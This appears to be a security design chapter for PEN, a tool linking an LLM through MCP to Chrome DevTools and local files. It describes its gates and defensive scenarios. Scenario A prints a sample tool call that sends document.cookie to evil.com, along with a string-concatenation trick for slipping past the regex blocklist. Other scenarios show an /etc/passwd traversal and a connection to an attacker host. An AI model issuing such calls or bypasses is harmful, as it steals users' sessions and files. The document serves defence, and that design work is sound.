# Part 10: Security Model

## Threat Model

PEN sits at the intersection of CDP (full browser control), MCP (LLM-driven tool execution), and the local file system. Each boundary is a potential attack surface.

| Boundary          | Threat                                  | Mitigation                                         |
| ----------------- | --------------------------------------- | -------------------------------------------------- |
| MCP ← LLM         | Malicious eval, read sensitive files    | Eval gating, expression blocklist, path validation |
| PEN → Chrome      | Full browser access                     | Localhost-only CDP                                 |
| PEN → File System | Temp files, path traversal              | Temp dir isolation, path checks                    |
| PEN → Network     | Source map fetching from arbitrary URLs | Not implemented (no fetching)                      |

An LLM connected via MCP can call any registered PEN tool with arbitrary parameters. The gates below prevent misuse.

## Gate 1: Eval Gating

`pen_evaluate` is the most dangerous tool — it executes arbitrary JavaScript in the browser.

**Default: disabled.** The tool is only registered if `--allow-eval` is passed at startup. Without it, the tool doesn't appear in `tools/list` and cannot be called.

```go
if opts.AllowEval {
    mcp.AddTool(s, evalTool, handleEvaluate(cdp))
    slog.Warn("pen_evaluate enabled — JavaScript execution allowed via MCP")
}
```

## Gate 2: Expression Blocklist

Even with `--allow-eval`, PEN blocks dangerous patterns:

```go
var blockedPatterns = []*regexp.Regexp{
    regexp.MustCompile(`(?i)\bfetch\s*\(`),
    regexp.MustCompile(`(?i)\bXMLHttpRequest\b`),
    regexp.MustCompile(`(?i)\bnavigator\.sendBeacon\b`),
    regexp.MustCompile(`(?i)\blocalStorage\b`),
    regexp.MustCompile(`(?i)\bsessionStorage\b`),
    regexp.MustCompile(`(?i)\bdocument\.cookie\b`),
    regexp.MustCompile(`(?i)\bwindow\.open\s*\(`),
    regexp.MustCompile(`(?i)\beval\s*\(`),
    regexp.MustCompile(`(?i)\bFunction\s*\(`),
    regexp.MustCompile(`(?i)\bimport\s*\(`),
}
```

Additionally, Unicode escape sequences (`\uXXXX`) are rejected to prevent blocklist bypass.

This is defense-in-depth, not a security boundary. A determined attacker can bypass regex filters. The real security is Gate 1.

## Gate 3: Path Traversal Prevention

Source tools accept file paths. `ValidateSourcePath` prevents traversal:

```go
func ValidateSourcePath(projectRoot, requestedPath string) (string, error)
```

Resolves the path, checks it's within the project root using `filepath.Rel` (handles case-insensitive filesystems and mixed separators). Rejects any path that resolves outside the root.

Temp files are validated separately via `ValidateTempPath` — must be within `os.TempDir()/pen/`.

## Gate 4: CDP Localhost Restriction

PEN only connects to localhost:

```go
func ValidateCDPURL(rawURL string) error
```

Allowed hosts: `localhost`, `127.0.0.1`, `::1`. Any other host is rejected at startup before the MCP server starts. For remote browsers, use SSH tunneling:

```bash
ssh -L 9222:localhost:9222 user@remote-server
pen serve --cdp-url ws://localhost:9222/devtools/browser
```

## Gate 5: Rate Limiting

Heavy tools have cooldowns:

| Tool                  | Cooldown |
| --------------------- | -------- |
| `pen_heap_snapshot`   | 10s      |
| `pen_capture_trace`   | 5s       |
| `pen_collect_garbage` | 5s       |

Prevents accidental resource exhaustion from rapid-fire LLM calls.

## Gate 6: Temp File Isolation

- Directory: `os.TempDir()/pen/` with `0700` permissions
- Files: created with `0600` permissions (owner-only)
- Cleaned up on normal exit and on context cancellation via `defer`

## Gate 7: HTTP Transport

When using HTTP mode:

- Default bind: `localhost:6100` — not exposed to network
- Warning logged if binding to all interfaces (`0.0.0.0:` or `:port`)
- No built-in auth — for network exposure, put behind a reverse proxy with auth

## Attack / Defense Scenarios

### A: LLM exfiltrates data via eval

```json
{
  "name": "pen_evaluate",
  "arguments": {
    "expression": "fetch('https://evil.com?d=' + document.cookie)"
  }
}
```

1. **Default**: Tool doesn't exist. MCP returns "unknown tool."
2. **With `--allow-eval`**: Blocked by expression filter (`fetch\s*\(` pattern).
3. **Obfuscated bypass** (`window['fet'+'ch'](...)`): Regex may miss this. This is why Gate 1 exists.

### B: Path traversal via source tools

```json
{
  "name": "pen_source_content",
  "arguments": { "urlPattern": "../../../../etc/passwd" }
}
```

`ValidateSourcePath` resolves to `/etc/passwd`, checks it against project root, rejects: "path resolves outside project root — access denied."

### C: Resource exhaustion

```
pen_heap_snapshot → success
pen_heap_snapshot → blocked (cooldown: 10s)
```

### D: Remote CDP connection

```bash
PEN_CDP_URL=ws://attacker.com:9222 pen serve
```

`ValidateCDPURL` rejects non-localhost hosts at startup. PEN exits before any MCP server starts.

## Security Checklist

| #   | Control                                     | Status |
| --- | ------------------------------------------- | ------ |
| 1   | `pen_evaluate` requires `--allow-eval`      | ✅     |
| 2   | Expression blocklist + Unicode escape check | ✅     |
| 3   | Path traversal prevention (source paths)    | ✅     |
| 4   | Path traversal prevention (temp paths)      | ✅     |
| 5   | CDP restricted to localhost                 | ✅     |
| 6   | Temp files: 0600 perms, isolated dir        | ✅     |
| 7   | Temp files cleaned on exit                  | ✅     |
| 8   | Rate limiting on heavy operations           | ✅     |
| 9   | HTTP binds to localhost by default          | ✅     |
| 10  | Graceful shutdown on SIGINT/SIGTERM         | ✅     |
